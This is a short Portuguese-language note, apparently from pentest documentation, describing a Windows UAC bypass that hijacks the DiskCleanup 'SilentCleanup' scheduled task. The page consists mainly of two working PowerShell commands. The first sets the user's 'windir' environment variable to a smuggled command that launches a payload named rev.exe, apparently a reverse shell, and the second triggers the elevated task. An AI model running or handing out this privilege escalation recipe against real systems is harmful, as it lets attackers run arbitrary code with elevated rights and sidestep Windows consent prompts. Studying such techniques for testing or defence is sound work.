---
title: "UAC Bypass"
---

# UAC Bypass

UAC bypass via sequestro da tarefa agendada do DiskCleanup. A tarefa `SilentCleanup` roda como SYSTEM sem prompt UAC e expande a variável `windir` do ambiente do usuário, permitindo injetar um comando arbitrário.

```powershell
# Setar windir para executar o payload
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Users\raquel\rev.exe & REM " -Force

# Disparar a tarefa agendada
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"
```
